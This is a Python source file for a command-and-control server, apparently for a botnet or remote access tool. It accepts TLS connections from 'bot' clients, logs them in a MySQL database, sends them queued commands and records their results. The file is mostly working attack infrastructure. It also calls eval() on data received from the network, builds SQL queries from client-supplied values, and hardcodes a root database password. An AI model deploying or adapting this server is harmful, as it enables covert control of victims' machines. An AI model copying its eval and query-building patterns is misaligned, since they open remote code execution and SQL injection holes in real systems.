#!/usr/bin/env python3
import os
import sys
import ssl
import socket
from threading import Thread
import subprocess
import time
import pymysql
"""
Python BOTs server: runs on hosts PC, clients connected to it can then be controlled
sent commands, move mouse, etc, from server.py.

openssl req -x509 -sha512 -days 365 -nodes -newkey rsa:2048 -keyout key.key -out certificate.crt
GB, Scotland, Glasgow, Bots, [blank], BotServer, [blank]
"""

#TODO: Tidy and Clean code up

#NOTE: There's currently little to none error handling
#NOTE: If cursor not getting updated rows, transaction isolation level in mysql DB needs to be changed to "read commited"
#      with statement: SET GLOBAL TRANSACTION ISOLATION LEVEL READ COMMITTED;

class Server:
    cert = "ssl_files/certificate.crt"
    key = "ssl_files/key.key"
    colours = {"INFO": "\033[1;37m", "ADD": "\033[1;32m", "REMOVE": "\033[1;31m", "TITLE": "\033[1;34m"}

    def __init__(self):
        #addr = (input("IP: "), int(input("Port: ")))
        addr = ("127.0.0.1", 999)
        self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_sock.bind(addr)
        self.server_sock.listen(5)

        db = pymysql.connect("localhost", "root", "pass", "Bots")
        cursor = db.cursor()
        cursor.execute("SET GLOBAL TRANSACTION ISOLATION LEVEL READ COMMITTED;")
        db.commit()
        clear_tables = "SET FOREIGN_KEY_CHECKS = 0;truncate table ClientCommand;truncate table Command;truncate table Client;SET FOREIGN_KEY_CHECKS = 1;"
        cursor.execute(clear_tables)
        db.commit()

        results = cursor.execute("select * from Server where IPAddress = '{}' and PortNumber = {}".format(addr[0], addr[1]))
        if results:
            cursor.execute("update Server set isActive = 1 where IPAddress = '{}' and PortNumber = {};".format(addr[0], addr[1]))
            db.commit()
        else:
            cursor.execute("insert into Server(isActive, IPAddress, PortNumber) values(1, '{}', {})".format(addr[0], addr[1]))
            db.commit()
        print("{}[*]{} Server binded to address:port:{} {}:{}".format("\033[1;36m", "\033[1;34m", "\033[1;37m", addr[0], addr[1]))
        #db.close()

        self.clients = {}

        listen = Thread(target=self.client_listener, daemon=True)
        listen.start()

        try:
            while True:
                #NOTE: Naive attempt at getting Server to have updated values from table,
                #      the server should NOT have to constantly disconnect and reconnect
                #db = pymysql.connect("localhost", "root", "pass", "Bots")
                cursor = db.cursor()
                rs = cursor.execute("select ClientCommand.CommandID, ClientID, Command from ClientCommand inner join Command on ClientCommand.CommandID = Command.CommandID where Sent is null")
                #rs = cursor.execute("select ClientCommand.CommandID, ClientID, Command from ClientCommand inner join Command on ClientCommand.CommandID = Command.CommandID")
                results = cursor.fetchall()
                if results:
                    for cmd in results:
                        print(["COMMAND", cmd])
                        try:
                            self.clients[cmd[1]][0].send(str(["COMMAND", cmd]).encode("utf-8"))
                        except KeyError:
                            continue
                        cursor.execute("update ClientCommand set Sent = 1 where ClientID = '{}' and CommandID = '{}'".format(cmd[1], cmd[0]))
                        db.commit()
                #db.close()

        except (KeyboardInterrupt, ValueError):
            pass

        for i in self.clients:
            self.clients[i][0].write("['EXIT']".encode("utf-8"))
            self.clients[i][0].close()

        self.server_sock.close()
        print("Server closed.")
        #db = pymysql.connect("localhost", "root", "pass", "Bots")
        cursor = db.cursor()
        cursor.execute("update Server set isActive = 0 where IPAddress = '{}' and PortNumber = {};".format(addr[0], addr[1]))
        cursor.execute(clear_tables)
        db.commit()
        db.close()

    def client_listener(self):
        print("{}[*]{} Listening for clients...".format("\033[1;36m", "\033[1;34m"))
        while True:
            client_sock, client_addr = self.server_sock.accept()
            new_client = Thread(target=self.handle_client, args=[client_sock], daemon=True)
            new_client.start()

    def handle_client(self, client_sock):
        ssl_sock = ssl.wrap_socket(client_sock, server_side=True, certfile=Server.cert, keyfile=Server.key, ssl_version=ssl.PROTOCOL_TLSv1)
        hostname_ID = ssl_sock.read().decode("utf-8").split(":--_:_--:")
        hostname = hostname_ID[0]
        ID = hostname_ID[1]
        #TODO: add lock to stop threads access self.clients and self.ID and same time
        self.clients[ID] = (ssl_sock, hostname, [])
        print("{}[+]{} Client connected:{} ID - {} , Hostname - {}".format("\033[1;32m", "\033[1;34m", "\033[1;37m", ID, hostname))

        db = pymysql.connect("localhost", "root", "pass", "Bots")
        cursor = db.cursor()
        cursor.execute("SET FOREIGN_KEY_CHECKS = 0;insert into Client values ('{}', '{}', 0);SET FOREIGN_KEY_CHECKS = 1;".format(ID, hostname))
        db.commit()

        try:
            while True:
                data = ssl_sock.read().decode()
                if not data or eval(data)[0] != "COMMAND_RESULT": break
                data = eval(data)
                print(data)
                cursor.execute("SET FOREIGN_KEY_CHECKS = 0;update ClientCommand set Result = '{}' where ClientID = '{}' and CommandID = '{}';SET FOREIGN_KEY_CHECKS = 1;".format(data[-1], data[2], data[1]))
                db.commit()
        except ValueError:
            pass
        finally:
            del self.clients[ID]
            print("{}[-]{} Client disconnected:{} ID - {}, Hostname - {}".format("\033[1;31m", "\033[1;34m", "\033[1;37m", ID, hostname))
            cursor.execute("SET FOREIGN_KEY_CHECKS = 0;delete from Client where ClientID = '{}';SET FOREIGN_KEY_CHECKS = 1;".format(ID))
            db.commit()
            ssl_sock.close()
            db.close()

if __name__ == '__main__':
    Server()
